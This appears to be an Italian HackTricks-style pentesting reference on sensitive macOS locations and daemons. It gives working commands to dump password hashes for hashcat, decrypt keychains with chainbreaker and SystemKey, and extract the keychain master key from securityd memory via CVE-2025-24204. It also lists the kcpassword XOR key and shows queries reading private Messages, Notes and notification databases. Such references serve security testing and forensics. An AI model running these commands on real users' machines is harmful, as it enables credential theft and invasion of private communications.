# Posizioni sensibili e daemon interessanti di macOS

{{#include ../../../banners/hacktricks-training.md}}

## Password

### Shadow Password

La shadow password viene memorizzata insieme alla configurazione dell'utente nei plist situati in **`/var/db/dslocal/nodes/Default/users/`**.\
Il seguente oneliner può essere utilizzato per estrarre **tutte le informazioni sugli utenti** (incluse le informazioni sugli hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Script come questo**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**questo**](https://github.com/octomagon/davegrohl.git) possono essere utilizzati per trasformare l'hash nel **formato** di **hashcat**.

Un one-liner alternativo che eseguirà il dump delle creds di tutti gli account non di servizio nel formato di hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Un altro modo per ottenere `ShadowHashData` di un utente consiste nell'utilizzare `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Questo file viene utilizzato **solo** quando il sistema viene avviato in **single-user mode** (quindi non molto frequentemente).

### Dump del Keychain

Quando si utilizza il binary `security` per **dumpare le password decrittografate**, verranno visualizzati diversi prompt che chiederanno all'utente di consentire questa operazione.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Sui macOS moderni, gli archivi di supporto più interessanti sono solitamente **`~/Library/Keychains/login.keychain-db`** e **`/Library/Keychains/System.keychain`**. Sono file basati su SQLite, ma l'accesso in plaintext è comunque gestito da **`securityd`**: il semplice furto del DB grezzo fornisce principalmente metadati e blob crittografati, a meno che non si riesca a recuperare anche la password dell'utente, `SystemKey` o una master key in memoria.<sup>[2]</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> In base a questo commento [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), sembra che questi tool non funzionino più su Big Sur.

### Panoramica di Keychaindump

È stato sviluppato un tool chiamato **keychaindump** per estrarre le password dai keychain di macOS, ma presenta limitazioni nelle versioni più recenti di macOS, come Big Sur, come indicato in una [discussione](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). L'uso di **keychaindump** richiede che l'attacker ottenga l'accesso ed effettui un privilege escalation fino a **root**. Il tool sfrutta il fatto che il keychain viene sbloccato per impostazione predefinita al login dell'utente, per comodità, consentendo alle applicazioni di accedervi senza richiedere ripetutamente la password dell'utente. Tuttavia, se un utente sceglie di bloccare il proprio keychain dopo ogni utilizzo, **keychaindump** diventa inefficace.

**Keychaindump** opera prendendo di mira un processo specifico chiamato **securityd**, descritto da Apple come un daemon per le operazioni di autorizzazione e crittografia, essenziale per accedere al keychain. Il processo di estrazione prevede l'identificazione di una **Master Key** derivata dalla password di login dell'utente. Questa chiave è essenziale per leggere il file del keychain. Per individuare la **Master Key**, **keychaindump** esegue la scansione dell'heap di memoria di **securityd** usando il comando `vmmap`, cercando potenziali chiavi nelle aree contrassegnate come `MALLOC_TINY`. Per esaminare queste posizioni di memoria viene utilizzato il seguente comando:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Dopo aver identificato le potenziali master keys, **keychaindump** cerca negli heap uno specifico pattern (`0x0000000000000018`) che indica un candidato per la master key. Per utilizzare questa chiave sono necessari ulteriori passaggi, inclusa la deobfuscation, come descritto nel codice sorgente di **keychaindump**. Gli analisti che si occupano di quest'area devono notare che i dati cruciali per decrittografare il keychain sono archiviati nella memoria del processo **securityd**. Un esempio di comando per eseguire **keychaindump** è:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) può essere utilizzato per estrarre i seguenti tipi di informazioni da un keychain OSX in modo forensicamente corretto:

- Password hashata del keychain, adatta al cracking con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
- Password Internet
- Password generiche
- Chiavi private
- Chiavi pubbliche
- Certificati X509
- Note sicure
- Password Appleshare

Data la password di sblocco del keychain, una master key ottenuta utilizzando [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), oppure un file di sblocco come SystemKey, Chainbreaker fornirà anche le password in chiaro.

Senza uno di questi metodi per sbloccare il keychain, Chainbreaker mostrerà tutte le altre informazioni disponibili.

#### **Dump delle chiavi del keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump delle chiavi del portachiavi (con password) con SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump delle chiavi del keychain (con password) tramite cracking dell'hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump delle chiavi del keychain (con password) tramite memory dump**

[Segui questi passaggi](../index.html#dumping-memory-with-osxpmem) per eseguire un **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump delle chiavi del keychain (con password) usando la password dell'utente**

Se conosci la password dell'utente, puoi usarla per **eseguire il dump e decrittografare i keychain appartenenti all'utente**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key tramite entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) includeva `/usr/bin/gcore` con l'entitlement **`com.apple.system-task-ports.read`**, quindi qualsiasi amministratore locale (o app firmata malevola) poteva eseguire il dump della memoria di **qualsiasi processo anche con SIP/TCC applicati**. Il dump di `securityd` espone in chiaro la **Keychain master key** e consente di decrittografare `login.keychain-db` senza la password dell'utente.<sup>[1]</sup>

**Rapida riproduzione sulle build vulnerabili (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Passa la chiave esadecimale estratta a Chainbreaker (`--key <hex>`) per decrittare il login keychain. Apple ha rimosso l'entitlement in **macOS 15.3+**, quindi funziona solo sulle build di Sequoia non patchate o sui sistemi che hanno mantenuto il binary vulnerabile.

### kcpassword

Il file **kcpassword** contiene la **password di login dell'utente**, ma solo se il proprietario del sistema ha **abilitato il login automatico**. Di conseguenza, l'utente verrà autenticato automaticamente senza che gli venga richiesta una password (il che non è molto sicuro).

La password è memorizzata nel file **`/etc/kcpassword`** con un'operazione XOR usando la chiave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Se la password dell'utente è più lunga della chiave, quest'ultima verrà riutilizzata.\
Questo rende la password piuttosto facile da recuperare, ad esempio usando script come [**questo**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informazioni interessanti nei database

### Messaggi
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifiche

Prima di **Sequoia**, in genere puoi trovare il database del Centro Notifiche in **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. In **Sequoia+**, Apple lo ha spostato nel group container protetto da TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

La maggior parte delle informazioni interessanti è memorizzata all'interno di colonne **blob**, quindi sarà necessario estrarre quel contenuto e trasformarlo in qualcosa di leggibile (`plutil -p -`, `strings` o un piccolo parser). Esempi di triage rapido:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Problemi recenti di privacy (NotificationCenter DB)

- In macOS **14.7–15.1** Apple memorizzava il contenuto dei banner nel database SQLite `db2/db` senza un'adeguata redazione. Le CVE **CVE-2024-44292/44293/40838/54504** consentivano a qualsiasi utente locale di leggere il testo delle notifiche degli altri utenti semplicemente aprendo il DB (senza alcun prompt TCC).
- Apple ha mitigato il problema spostando il DB in `group.com.apple.usernoted` e proteggendolo con TCC nelle versioni più recenti di Sequoia; quindi, sui sistemi attuali, normalmente è necessario il contesto dell'utente corretto o un TCC bypass per leggerlo.<sup>[3]</sup>
- Sugli endpoint legacy, copia insieme i file `db`, `db-wal` e `db-shm` prima di un aggiornamento o di un riavvio se vuoi preservare gli artefatti.

### Note

Le **note** dell'utente si trovano in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Se il one-liner precedente produce troppo rumore, esporta `ZICNOTEDATA.ZDATA`, decomprimilo con gunzip e analizza il protobuf: di solito è più affidabile che eseguire direttamente `strings` sul database SQLite.

### Attività in background / Elementi di login

A partire da **Ventura**, gli elementi di login approvati dall'utente e diverse attività in background vengono tracciati negli archivi **BTM**, come **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** e la cache di sistema versionata **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Questi file sono utili per identificare rapidamente persistence, helper tools e alcuni elementi in background gestiti da MDM:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Per l'angolo della persistence e gli internals di BTM, consulta [the auto-start locations page](../../macos-auto-start-locations.md#login-items) e [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).

## Preferenze

Nelle app macOS le preferenze si trovano in **`$HOME/Library/Preferences`**, mentre in iOS si trovano in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS lo strumento cli **`defaults`** può essere utilizzato per **modificare il file Preferences**.

**`/usr/sbin/cfprefsd`** gestisce gli XPC services `com.apple.cfprefsd.daemon` e `com.apple.cfprefsd.agent` e può essere chiamato per eseguire azioni come la modifica delle preferenze.

## OpenDirectory permissions.plist

Il file `/System/Library/OpenDirectory/permissions.plist` contiene le permissions applicate agli attributi dei nodi ed è protetto da SIP.\
Questo file concede permissions a utenti specifici tramite UUID (e non uid), consentendo loro di accedere a informazioni sensibili specifiche come `ShadowHashData`, `HeimdalSRPKey` e `KerberosKeys`, tra le altre:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Notifiche di sistema

### Notifiche Darwin

Il demone principale per le notifiche è **`/usr/sbin/notifyd`**. Per ricevere notifiche, i client devono registrarsi tramite la porta Mach `com.apple.system.notification_center` (verificali con `sudo lsmp -p <pid notifyd>`). Il demone è configurabile tramite il file `/etc/notify.conf`.

I nomi utilizzati per le notifiche sono notazioni DNS inverse univoche e, quando una notifica viene inviata a uno di essi, la riceveranno i client che hanno indicato di poterla gestire.

È possibile eseguire il dump dello stato corrente (e visualizzare tutti i nomi) inviando il segnale SIGUSR2 al processo notifyd e leggendo il file generato: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Il **Distributed Notification Center**, il cui binario principale è **`/usr/sbin/distnoted`**, è un altro modo per inviare notifiche. Espone alcuni servizi XPC ed esegue alcuni controlli per tentare di verificare i client.

### Apple Push Notifications (APN)

In questo caso, le applicazioni possono registrarsi per dei **topics**. Il client genererà un token contattando i server Apple tramite **`apsd`**.\
Successivamente, anche i provider avranno generato un token e potranno connettersi ai server Apple per inviare messaggi ai client. Questi messaggi saranno ricevuti localmente da **`apsd`**, che inoltrerà la notifica all'applicazione in attesa.

Le preferenze si trovano in `/Library/Preferences/com.apple.apsd.plist`.

Esiste un database locale dei messaggi che si trova in macOS in `/Library/Application\ Support/ApplePushService/aps.db` e in iOS in `/var/mobile/Library/ApplePushService`. Contiene 3 tabelle: `incoming_messages`, `outgoing_messages` e `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
È inoltre possibile ottenere informazioni sul daemon e sulle connessioni utilizzando:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notifiche utente

Queste sono notifiche che l'utente dovrebbe visualizzare sullo schermo:

- **`CFUserNotification`**: queste API forniscono un modo per visualizzare sullo schermo un pop-up con un messaggio.
- **The Bulletin Board**: in iOS mostra un banner che scompare e viene memorizzato nel Notification Center.
- **`NSUserNotificationCenter`**: questo è il bulletin board di iOS in MacOS. Nelle versioni meno recenti di macOS, il database si trova solitamente in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; su Sequoia+ è stato spostato in `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Riferimenti

- [1] [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
